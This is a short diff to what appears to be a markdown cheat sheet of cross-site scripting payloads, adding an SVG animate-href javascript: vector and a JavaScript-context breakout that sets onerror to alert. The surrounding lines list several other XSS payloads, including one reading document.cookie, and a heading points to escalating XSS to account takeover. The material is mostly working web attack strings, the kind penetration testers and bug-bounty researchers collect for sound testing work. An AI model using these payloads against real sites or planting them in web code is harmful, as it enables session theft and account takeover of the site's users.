@@ -2968,6 +2968,8 @@ javascript:alert(document.cookie)
 "><svg><animatetransform onbegin=alert(1)>
 http://foo?&apos;-alert(1)-&apos;
 ${alert(1)}
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
+'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
 ```
 
 #### <ins>XSS -> ATO Escalation</ins> [[Reference](https://twitter.com/Rhynorater/status/1682401924635566080)]
